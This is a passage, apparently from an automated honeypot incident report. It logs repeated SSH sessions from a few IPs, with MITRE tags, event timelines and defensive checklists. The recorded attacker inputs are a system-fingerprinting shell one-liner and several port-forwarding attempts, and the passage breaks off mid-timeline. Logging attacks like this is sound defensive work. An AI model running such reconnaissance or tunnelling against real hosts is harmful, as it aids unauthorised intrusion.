| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:12:56` | `cowrie.session.connect` |
| `2026-07-11 07:12:56` | `cowrie.client.version` |
| `2026-07-11 07:12:56` | `cowrie.client.kex` |
| `2026-07-11 07:12:57` | `cowrie.login.success` |
| `2026-07-11 07:12:57` | `cowrie.session.params` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.success` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:57` | `cowrie.command.input` |
| `2026-07-11 07:12:58` | `cowrie.log.closed` |
| `2026-07-11 07:12:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4685f3f28b59

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:14 |
| **Last Seen** | 2026-07-11 07:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:14:41` | `cowrie.session.connect` |
| `2026-07-11 07:14:41` | `cowrie.client.version` |
| `2026-07-11 07:14:41` | `cowrie.client.kex` |
| `2026-07-11 07:14:41` | `cowrie.login.success` |
| `2026-07-11 07:14:42` | `cowrie.session.params` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.success` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:42` | `cowrie.command.input` |
| `2026-07-11 07:14:43` | `cowrie.log.closed` |
| `2026-07-11 07:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0b3ad7bda2d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:16 |
| **Last Seen** | 2026-07-11 07:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:16:26` | `cowrie.session.connect` |
| `2026-07-11 07:16:26` | `cowrie.client.version` |
| `2026-07-11 07:16:26` | `cowrie.client.kex` |
| `2026-07-11 07:16:26` | `cowrie.login.success` |
| `2026-07-11 07:16:27` | `cowrie.session.params` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.success` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:27` | `cowrie.command.input` |
| `2026-07-11 07:16:28` | `cowrie.log.closed` |
| `2026-07-11 07:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ceb19fb8c71

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-11 07:16 |
| **Last Seen** | 2026-07-11 07:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:16:41` | `cowrie.session.connect` |
| `2026-07-11 07:16:41` | `cowrie.client.version` |
| `2026-07-11 07:16:41` | `cowrie.client.kex` |
| `2026-07-11 07:16:41` | `cowrie.login.success` |
| `2026-07-11 07:16:41` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:16:41` | `cowrie.direct-tcpip.ja4` |
| `2026-07-11 07:16:41` | `cowrie.direct-tcpip.data` |
| `2026-07-11 07:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da1049c2400b

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 07:18 |
| **Last Seen** | 2026-07-11 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:18:09` | `cowrie.session.connect` |
| `2026-07-11 07:18:09` | `cowrie.client.version` |
| `2026-07-11 07:18:09` | `cowrie.client.kex` |
| `2026-07-11 07:18:10` | `cowrie.login.success` |
| `2026-07-11 07:18:10` | `cowrie.session.params` |
| `2026-07-11 07:18:10` | `cowrie.command.input` |
| `2026-07-11 07:18:11` | `cowrie.log.closed` |
| `2026-07-11 07:18:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28795b6a3019

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:18 |
| **Last Seen** | 2026-07-11 07:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:18:11` | `cowrie.session.connect` |
| `2026-07-11 07:18:11` | `cowrie.client.version` |
| `2026-07-11 07:18:11` | `cowrie.client.kex` |
| `2026-07-11 07:18:12` | `cowrie.login.success` |
| `2026-07-11 07:18:12` | `cowrie.session.params` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.success` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:12` | `cowrie.command.input` |
| `2026-07-11 07:18:13` | `cowrie.command.input` |
| `2026-07-11 07:18:13` | `cowrie.command.input` |
| `2026-07-11 07:18:13` | `cowrie.log.closed` |
| `2026-07-11 07:18:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30bc4741b3c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:19 |
| **Last Seen** | 2026-07-11 07:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:19:54` | `cowrie.session.connect` |
| `2026-07-11 07:19:54` | `cowrie.client.version` |
| `2026-07-11 07:19:54` | `cowrie.client.kex` |
| `2026-07-11 07:19:54` | `cowrie.login.success` |
| `2026-07-11 07:19:55` | `cowrie.session.params` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.success` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:55` | `cowrie.command.input` |
| `2026-07-11 07:19:56` | `cowrie.log.closed` |
| `2026-07-11 07:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44379b591a57

| Field | Detail |
|---|---|
| **Source IP** | `121.159.71[.]249` |
| **First Seen** | 2026-07-11 07:21 |
| **Last Seen** | 2026-07-11 07:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:21:10` | `cowrie.session.connect` |
| `2026-07-11 07:21:11` | `cowrie.client.version` |
| `2026-07-11 07:21:11` | `cowrie.client.kex` |
| `2026-07-11 07:21:14` | `cowrie.login.success` |
| `2026-07-11 07:21:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.159.71[.]249` to AbuseIPDB if not already reported
- [ ] Block `121.159.71[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a62f818e743

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:21 |
| **Last Seen** | 2026-07-11 07:21 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:21:39` | `cowrie.session.connect` |
| `2026-07-11 07:21:39` | `cowrie.client.version` |
| `2026-07-11 07:21:39` | `cowrie.client.kex` |
| `2026-07-11 07:21:39` | `cowrie.login.success` |
| `2026-07-11 07:21:40` | `cowrie.session.params` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.success` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:40` | `cowrie.command.input` |
| `2026-07-11 07:21:41` | `cowrie.log.closed` |
| `2026-07-11 07:21:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31bb712058b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:23 |
| **Last Seen** | 2026-07-11 07:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:23:24` | `cowrie.session.connect` |
| `2026-07-11 07:23:24` | `cowrie.client.version` |
| `2026-07-11 07:23:24` | `cowrie.client.kex` |
| `2026-07-11 07:23:25` | `cowrie.login.success` |
| `2026-07-11 07:23:26` | `cowrie.session.params` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.success` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.command.input` |
| `2026-07-11 07:23:26` | `cowrie.log.closed` |
| `2026-07-11 07:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0064002e2313

| Field | Detail |
|---|---|
| **Source IP** | `65.20.233[.]110` |
| **First Seen** | 2026-07-11 07:24 |
| **Last Seen** | 2026-07-11 07:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:24:53` | `cowrie.session.connect` |
| `2026-07-11 07:24:53` | `cowrie.client.version` |
| `2026-07-11 07:24:53` | `cowrie.client.kex` |
| `2026-07-11 07:24:55` | `cowrie.login.success` |
| `2026-07-11 07:24:55` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:25:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.233[.]110` to AbuseIPDB if not already reported
- [ ] Block `65.20.233[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58058332aaea

| Field | Detail |
|---|---|
| **Source IP** | `61.37.150[.]6` |
| **First Seen** | 2026-07-11 07:25 |
| **Last Seen** | 2026-07-11 07:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:25:00` | `cowrie.session.connect` |
| `2026-07-11 07:25:01` | `cowrie.client.version` |
| `2026-07-11 07:25:01` | `cowrie.client.kex` |
| `2026-07-11 07:25:03` | `cowrie.login.success` |
| `2026-07-11 07:25:04` | `cowrie.direct-tcpip.request` |
| `2026-07-11 07:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.37.150[.]6` to AbuseIPDB if not already reported
- [ ] Block `61.37.150[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-293184888ac6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:25 |
| **Last Seen** | 2026-07-11 07:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:25:17` | `cowrie.session.connect` |
| `2026-07-11 07:25:17` | `cowrie.client.version` |
| `2026-07-11 07:25:17` | `cowrie.client.kex` |
| `2026-07-11 07:25:18` | `cowrie.login.success` |
| `2026-07-11 07:25:19` | `cowrie.session.params` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.success` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:19` | `cowrie.command.input` |
| `2026-07-11 07:25:20` | `cowrie.log.closed` |
| `2026-07-11 07:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-437e5a1f9efe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:27 |
| **Last Seen** | 2026-07-11 07:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:27:08` | `cowrie.session.connect` |
| `2026-07-11 07:27:08` | `cowrie.client.version` |
| `2026-07-11 07:27:08` | `cowrie.client.kex` |
| `2026-07-11 07:27:09` | `cowrie.login.success` |
| `2026-07-11 07:27:10` | `cowrie.session.params` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.success` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.command.input` |
| `2026-07-11 07:27:10` | `cowrie.log.closed` |
| `2026-07-11 07:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]233` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e3ca9866630

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]233` |
| **First Seen** | 2026-07-11 07:28 |
| **Last Seen** | 2026-07-11 07:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 07:28:52` | `cowrie.session.connect` |
| `2026-07-11 07:28:53` | `cowrie.client.version` |
| `2026-07-11 07:28:53` | `cowrie.client.kex` |
| `2026-07-11 07:28:53` | `cowrie.login.success` |
| `2026-07-11 07:28:54` | `cowrie.session.params` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.success` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
| `2026-07-11 07:28:54` | `cowrie.command.input` |
